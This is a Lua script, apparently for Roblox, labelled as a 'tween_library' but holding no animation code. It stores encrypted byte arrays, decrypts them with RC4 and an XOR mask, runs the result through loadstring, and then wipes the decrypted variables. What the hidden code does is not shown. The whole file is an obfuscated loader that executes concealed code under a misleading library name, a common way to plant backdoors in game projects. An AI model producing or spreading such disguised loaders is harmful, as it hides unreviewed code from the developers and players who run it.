-- Protected Segment (tween_library)
local pcXGAonq = 89
local HabLUCSk = {
{65,0,153,12,57,215,47,112,41,163,168,99,25,95,177,171,87,105,237,238,69,169,178,129,80,153,198,249,188,169,132,107,164,100,95,137,4,92,232,131,152,77,229,35,169,91,229,147,32,234,43,120,239,45,212,171,84,194,133,241},{48,41,252,44,165,78,220,157,253,27,0,151,253,41,12,129,191,85,112,130,43,63,76,139,167,119,173,210,66,157,212,229,27,199,42,118,234,190,25,153,212,249,231,42,232,192,57,154,211,9,66,151,215,153,68,51,8,88,243,161},{31,240,129,24,154,144,166,42,211,97,102,213,166,3,2,148,185,44,137,58,164,223,156,29,32}
}
local RtBwbRiv = "PDUxGnJctGtWDNpj"

local function EhaZLLqF(lSgLlNsN_data, lSgLlNsN_key)
    if type(lSgLlNsN_key) ~= "string" or #lSgLlNsN_key == 0 then return "" end
    local lSgLlNsN = {}
    for eyOznGrq = 0, 255 do lSgLlNsN[eyOznGrq] = eyOznGrq end
    local TUoklHHv = 0
    for eyOznGrq = 0, 255 do
        local DCvInuGz = lSgLlNsN_key:byte((eyOznGrq % #lSgLlNsN_key) + 1)
        TUoklHHv = (TUoklHHv + lSgLlNsN[eyOznGrq] + DCvInuGz) % 256
        lSgLlNsN[eyOznGrq], lSgLlNsN[TUoklHHv] = lSgLlNsN[TUoklHHv], lSgLlNsN[eyOznGrq]
    end
    local eyOznGrq = 0
    local TUoklHHv = 0
    local czyekJyi = {}
    for _, fvowevPT in ipairs(lSgLlNsN_data) do
        eyOznGrq = (eyOznGrq + 1) % 256
        TUoklHHv = (TUoklHHv + lSgLlNsN[eyOznGrq]) % 256
        lSgLlNsN[eyOznGrq], lSgLlNsN[TUoklHHv] = lSgLlNsN[TUoklHHv], lSgLlNsN[eyOznGrq]
        local DCvInuGz = lSgLlNsN[(lSgLlNsN[eyOznGrq] + lSgLlNsN[TUoklHHv]) % 256]
        local unmasked = bit32.bxor(fvowevPT, pcXGAonq)
        table.insert(czyekJyi, string.char(bit32.bxor(unmasked, DCvInuGz)))
    end
    return table.concat(czyekJyi)
end

local lSgLlNsN_flat = {}
for _, chunk in ipairs(HabLUCSk) do
    for _, byte in ipairs(chunk) do
        table.insert(lSgLlNsN_flat, byte)
    end
end

local decrypted = EhaZLLqF(lSgLlNsN_flat, RtBwbRiv)
local HoHCNFeB, FHRKVrBw = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(lSgLlNsN_flat)
lSgLlNsN_flat = nil

if HoHCNFeB then 
    local result = HoHCNFeB() 
    decrypted = nil
    HoHCNFeB = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "tween_library" .. "): " .. tostring(FHRKVrBw)) 
end
